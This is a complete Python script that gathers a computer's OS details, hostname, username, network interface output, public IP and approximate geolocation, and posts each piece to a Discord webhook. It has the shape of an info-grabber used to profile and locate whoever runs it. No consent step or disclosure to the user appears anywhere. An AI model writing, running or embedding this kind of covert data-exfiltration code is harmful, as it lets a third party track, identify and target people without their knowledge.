import os
import platform
import socket
import getpass
from subprocess import run, CalledProcessError
import requests
from dotenv import load_dotenv


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ENV_PATH = os.path.join(BASE_DIR, ".env")

if os.path.exists(ENV_PATH):
    load_dotenv(ENV_PATH)
else:
    print(f"Warning: .env file not found at {ENV_PATH}")

WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
if not WEBHOOK_URL:
    raise ValueError("Discord webhook URL not set in .env (DISCORD_WEBHOOK_URL)")


def send_to_discord(content: str) -> None:
    """Send a message to Discord webhook."""
    if not content.strip():
        return

    try:
        response = requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)
        if response.status_code == 204:
            print("Message sent successfully.")
        else:
            print(f"Failed to send message: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error sending to Discord: {e}")


def run_command(command: list[str]) -> str:
    """Run a system command and return stdout (truncated if too long)."""
    try:
        result = run(command, capture_output=True, text=True, check=True)
        output = result.stdout.strip()
        if len(output) > 1900:  # reserve buffer for formatting
            output = output[:1897] + "..."
        return output
    except CalledProcessError as e:
        return f"Error running command: {e}"
    except Exception as e:
        return f"Unexpected error: {e}"


def get_public_ip() -> str | None:
    """Fetch public IP address from ipify."""
    try:
        response = requests.get("https://api64.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        return response.json().get("ip")
    except requests.RequestException as e:
        print(f"Error fetching public IP: {e}")
        return None


def get_location(ip: str) -> str | None:
    """Fetch approximate location info from IP (using ipinfo.io)."""
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        response.raise_for_status()
        data = response.json()

        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country", "Unknown")
        org = data.get("org", "Unknown ISP")
        loc = data.get("loc", "Unknown coordinates")

        return (
            f"City: {city}\n"
            f"Region: {region}\n"
            f"Country: {country}\n"
            f"Coordinates: {loc}\n"
            f"ISP: {org}"
        )
    except requests.RequestException as e:
        print(f"Error fetching location info: {e}")
        return None


def get_system_info() -> str:
    """Collect basic system information."""
    uname = platform.uname()
    hostname = socket.gethostname()
    username = getpass.getuser()

    info = (
        f"System: {uname.system} {uname.release} ({uname.version})\n"
        f"Machine: {uname.machine}\n"
        f"Processor: {uname.processor}\n"
        f"Hostname: {hostname}\n"
        f"Username: {username}"
    )
    return info


def main():
    
    sysinfo = get_system_info()
    send_to_discord(f"```Machine Info:\n{sysinfo}\n```")

    local_cmd = ["ipconfig"] if os.name == "nt" else ["ifconfig"]
    local_ip_output = run_command(local_cmd)
    send_to_discord(f"```Local IPs:\n{local_ip_output}\n```")

    public_ip = get_public_ip()
    if public_ip:
        send_to_discord(f"```Public IP:\n{public_ip}\n```")

        location = get_location(public_ip)
        if location:
            send_to_discord(f"```Approx. Location:\n{location}\n```")


if __name__ == "__main__":
    main()
